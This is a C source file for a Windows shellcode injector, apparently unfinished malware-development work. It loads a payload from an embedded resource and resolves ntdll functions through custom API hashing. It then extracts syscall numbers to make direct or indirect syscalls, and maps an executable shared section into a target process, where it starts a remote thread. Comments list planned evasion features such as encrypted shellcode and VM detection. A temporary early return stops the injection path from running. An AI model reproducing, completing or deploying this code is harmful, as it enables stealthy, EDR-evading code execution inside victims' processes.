#include "headers.h"
#include "resource.h"
#define SEED 9


// NTAPI Remote Mapping Syscalls: DONE
// NTQuerySystem Find Notepad: NOPE
// RC4 Encrypted Shellcode: NOPE
// API HASHING: SEMI-DONE
// String Hashing: NOPE
// Custom GetProcAddress: DONE
// Custom GetModuleHandleW: DONE
// VM Detection: NOPE
//


// NOTE FOR LATER
	// Just Stored Payload in rsrc, needs to be decrypted and remove return 1, on line 150
	// Get Key From \projects\ALL-IN-ONE\crypt.c

unsigned char code[278];


DWORD FN_OpenSSN;
UINT_PTR FN_OpenSyscall;
DWORD FN_CreateSecSSN;
UINT_PTR FN_CreateSecSyscall;
DWORD FN_MapViewSSN;
UINT_PTR FN_MapViewSyscall;
DWORD FN_ThreadSSN;
UINT_PTR FN_ThreadSyscall;
DWORD FN_QuerySSN;
UINT_PTR FN_QuerySyscall;


UINT32 hshA(IN PCHAR str) {
	SIZE_T index = 0;
	UINT32 hshs = 0;
	SIZE_T len = 0;

	len = lstrlenA(str);

	while (index != len) {
		hshs += str[index++];
		hshs += hshs >> SEED;
		hshs += hshs << 6;
	}

	hshs += hshs << 3;
	hshs ^= hshs >> 11;
	hshs += hshs << 15;

	return hshs;
}

UINT32 hshW(IN PWCHAR str) {
	SIZE_T index = 0;
	UINT32 hshs = 0;
	SIZE_T len = 0;

	len = lstrlenW(str);

	while (index != len) {
		hshs += str[index++];
		hshs += hshs >> SEED;
		hshs += hshs << 6;
	}

	hshs += hshs << 3;
	hshs ^= hshs >> 11;
	hshs += hshs << 15;

	return hshs;
}




VOID FindNums(IN HMODULE hNTDLL, IN DWORD Funchsh, OUT DWORD* SSN, OUT UINT_PTR* SYSCALL) {
	UINT_PTR NtFunctionAddr = NULL;
	//BYTE SysOpcodes[2] = { 0x0F, 0x05 }; // These Are The OpCodes For SYSCALL, We Use Them To Compare Against, so we Know We found the Syscall

	//printf("0x%p\n", hNTDLL);
	//("Getting Address Of %s\n", FuncName);
	NtFunctionAddr = (UINT_PTR)CProc(hNTDLL, Funchsh); // Get Address Of Our Function (NtOpenProcess For Example)

	if (NtFunctionAddr == NULL) {
		//printf("Failed Finding Address\tCode: 0x%ld", GetLastError());
		return NULL;
	}

	//("Getting SSN...");
	*SSN = ((PBYTE)(NtFunctionAddr + 4))[0]; // SSN Number is 9/10 Stored 4 bytes From Start
	*SYSCALL = NtFunctionAddr + 0x12;       //  Syscall number Is Stored 12 bytes From Start Of Function

	printf("Got SSN [0x%1x]\n\n", *SSN); // Print SSN Number
}



int main(int argc, char* argv[]) {
	HANDLE hProc   = NULL;
	HANDLE hThread = NULL;
	DWORD pID = atoi(argv[1]);
	DWORD ndll = 0x9891d63e;
	HMODULE ndltt = CustomGetHandle1(ndll);
	OBJECT_ATTRIBUTES OA = { sizeof(OA),NULL };
	CLIENT_ID cid = { (HANDLE)pID,NULL };
	SIZE_T cSize = sizeof(code);
	DWORD Qu = 0x0c5774cb;

	printf("ntdll: 0x%p\n", ndltt);

	HRSRC rRcs = NULL;
	HGLOBAL hGlobal = NULL;
	PVOID pPayloadAddress = NULL;
	SIZE_T Payload_size = 0;

	rRcs = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (rRcs == NULL) {
		//printf("Failed to find resource");
		return 1;
	}

	// Load the RCDATA Into Memory Space
	hGlobal = LoadResource(NULL, rRcs);
	if (hGlobal == NULL) {
		//printf("Failed Finding Resource");
		return 1;
	}

	// Get The Address Where our shellcode starts
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		//printf("Failed Getting Address");
		return 1;
	}

	// Get The Size Of the Payload
	Payload_size = SizeofResource(NULL, rRcs);
	if (Payload_size == NULL) {
		//printf("Failed Getting size");
		return 1;
	}

	printf("Payload Location: 0x%p\n\n", pPayloadAddress);
	printf("PayLoad Size: %d-Bytes\n", Payload_size);

	memcpy(code, pPayloadAddress, Payload_size);

	return 1;


	printf("[+] Getting Handle To Process [%ld]\n", pID);
	DWORD op = 0x73637d5d;
	
	FindNums(ndltt, op, &FN_OpenSSN, &FN_OpenSyscall);
	NTSTATUS stat = P_Open(&hProc, PROCESS_ALL_ACCESS, &OA, &cid);
	if (stat != 0x0) {
		printf("Failed Handle");
		return EXIT_FAILURE;
	}
	printf("HANDLE: 0x%p\n", hProc);

	printf("Creating Shared Memory...\n");
	DWORD Cr = 0x76e9e705;
	FindNums(ndltt, Cr, &FN_CreateSecSSN, &FN_CreateSecSyscall);
	HANDLE pHandle = NULL;
	stat = P_CreateSec(&pHandle, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&cSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (stat != 0x0) {
		printf("Shared Mem Fail");
		return EXIT_FAILURE;
	}
	printf("Shared Memory Address: 0x%p\n\n", pHandle);

	DWORD Ma = 0xc4205b50;
	PVOID lBuffer = NULL;
	FindNums(ndltt, Ma, &FN_MapViewSSN, &FN_MapViewSyscall);
	stat = P_MapView(pHandle, GetCurrentProcess(), &lBuffer, NULL, NULL, NULL, (SIZE_T*)&cSize, ViewUnmap, NULL, PAGE_READWRITE);
	printf("Local: 0x%p\n\n", lBuffer);

	memcpy(lBuffer, code, cSize);

	PVOID rBuffer = NULL;
	stat = P_MapView(pHandle, hProc, &rBuffer, NULL, NULL, NULL, (SIZE_T*)&cSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
	if (stat != 0x0) {
		printf("Remote Fail");
		return EXIT_FAILURE;
	}
	printf("Remote: 0x%p\n\n", rBuffer);


	DWORD Th = 0x0e3f8308;
	FindNums(ndltt, Th, &FN_ThreadSSN, &FN_ThreadSyscall);
	stat = P_CreateThread(&hThread, THREAD_ALL_ACCESS, &OA, hProc, (PTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, NULL);
	printf("Thread Started...");
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hProc);
	CloseHandle(hThread);




	return 0;
}